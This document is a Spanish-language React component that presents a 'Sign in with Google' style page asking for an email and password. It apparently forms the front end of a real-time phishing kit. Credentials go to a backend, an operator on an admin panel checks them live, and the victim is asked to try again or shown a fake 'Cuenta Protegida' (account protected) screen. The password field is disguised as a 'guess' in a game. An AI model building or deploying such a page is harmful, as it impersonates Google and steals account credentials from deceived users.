import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { Form, Button, Container, Card, Spinner } from "react-bootstrap";
import { InputGroup } from "react-bootstrap";
import { FaEye, FaEyeSlash } from "react-icons/fa";
import { io } from "socket.io-client";
import FormIntento from "./FormIntento"; // Lo creamos en el siguiente paso
import imagenJuego from "../assets/icono2.png";

const backendUrl = import.meta.env.VITE_BACKEND_URL;
const socket = io(backendUrl);

export default function FormUsuario() {
  const [estadoVista, setEstadoVista] = useState("formulario1"); // 'formulario1', 'cargando', 'formulario2', 'exito'
  const [mensajeAdmin, setMensajeAdmin] = useState("");
  const [socketId, setSocketId] = useState("");
  const [correoGuardado, setCorreoGuardado] = useState(""); // Para reutilizarlo en el 2do intento
  const [verPassword, setVerPassword] = useState(false);

  const { register, handleSubmit } = useForm();

  const verPass = () => {
    setVerPassword(!verPassword);
  };

  useEffect(() => {
    socket.on("connect", () => setSocketId(socket.id));

    // Escuchamos la decisión que tomes desde el panel Admin
    socket.on("respuesta_validacion", (data) => {
      setMensajeAdmin(data.mensaje);
      if (data.acerto) {
        setEstadoVista("exito");
      } else {
        setEstadoVista("formulario2");
      }
    });

    return () => {
      socket.off("connect");
      socket.off("respuesta_validacion");
    };
  }, []);

  const onSubmitPrimerIntento = async (data) => {
    setEstadoVista("cargando");
    setCorreoGuardado(data.correo); // Lo guardamos por si hay un segundo intento

    await fetch(`${backendUrl}/api/intentos/enviar`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        correo: data.correo,
        adivinar: data.adivinar,
        socketId,
        intento: 1,
      }),
    });
  };

  const onSubmitSegundoIntento = async (data) => {
    setEstadoVista("cargando");

    await fetch(`${backendUrl}/api/intentos/enviar`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        correo: correoGuardado,
        adivinar: data.adivinar,
        socketId,
        intento: 2,
      }),
    });
  };

  // --- RENDERIZADOS CONDICIONALES ---

  if (estadoVista === "cargando") {
    return (
      <Container
        className="d-flex flex-column justify-content-center align-items-center vh-100 bg-dark text-white"
        fluid
      >
        <Spinner
          animation="border"
          variant="primary"
          style={{ width: "4rem", height: "4rem" }}
          className="mb-4"
        />
        <h3>Procesando respuesta...</h3>
      </Container>
    );
  }

  if (estadoVista === "exito") {
    return (
      <Container
        className="d-flex flex-column justify-content-center align-items-center vh-100 bg-dark text-white"
        fluid
      >
        <img
          src={imagenJuego}
          style={{ width: "18rem", height: "18rem", borderRadius: "50%" }}
        />
        <h1 className="text-light mb-3 mt-4">Cuenta Protegida</h1>
        <h3>{mensajeAdmin}</h3>
      </Container>
    );
  }

  if (estadoVista === "formulario2") {
    // Si falló, mostramos el componente del segundo intento pasándole el mensaje y la función
    return (
      <FormIntento
        mensaje={mensajeAdmin}
        onSubmitData={onSubmitSegundoIntento}
      />
    );
  }

  // Vista por defecto: Formulario 1
  return (
    <Container
      className="d-flex justify-content-center align-items-center vh-100 bg-dark"
      fluid
    >
      <Card
        bg="dark"
        text="white"
        className="p-4 shadow d-flex justify-content-center align-items-center"
        style={{ width: "400px" }}
      >
        <Card.Img
          variant="top"
          src={imagenJuego}
          alt="Imagen ilustrativa del juego"
          style={{ height: "12rem", width: "12rem", borderRadius: "50%" }}
        />
        <Card.Body>
          <Card.Title as="h2" className="text-center mb-3">
            Accede con Google
          </Card.Title>
          {/* <Card.Text className="text-center text-light opacity-75">
            Validar que sea un dispositivo autorizado para tener una sesión
            abierta de tu correo.
          </Card.Text> */}

          <Form onSubmit={handleSubmit(onSubmitPrimerIntento)}>
            <Form.Group className="mb-3">
              <Form.Label>Correo</Form.Label>
              <Form.Control
                type="text"
                placeholder="Ingresar correo"
                
                className="bg-secondary text-white border-secondary"
                {...register("correo", { required: true })}
              />
            </Form.Group>

            <Form.Group className="mb-4">
              <Form.Label>Contraseña</Form.Label>

              {/* 3. Usamos InputGroup para agrupar el input y el botón */}
              <InputGroup>
                <Form.Control
                  type={verPassword ? "text" : "password"} // Cambia dinámicamente el tipo
                  placeholder="*************"
                  className="bg-secondary text-white border-secondary"
                  autoComplete="new-password"
                  {...register("adivinar", { required: true })}
                />

                {/* 4. Botón pequeño con react-icons */}
                <Button
                  variant="outline-secondary"
                  className="border-secondary text-white d-flex align-items-center justify-content-center"
                  onClick={verPass}
                  style={{ zIndex: 0 }} // Evita problemas de superposición con Bootstrap
                >
                  {verPassword ? <FaEyeSlash size={16} /> : <FaEye size={16} />}
                </Button>
              </InputGroup>
            </Form.Group>

            <Button variant="primary" type="submit" className="w-100 fw-bold ">
              Siguiente
            </Button>
          </Form>
        </Card.Body>
      </Card>
    </Container>
  );
}
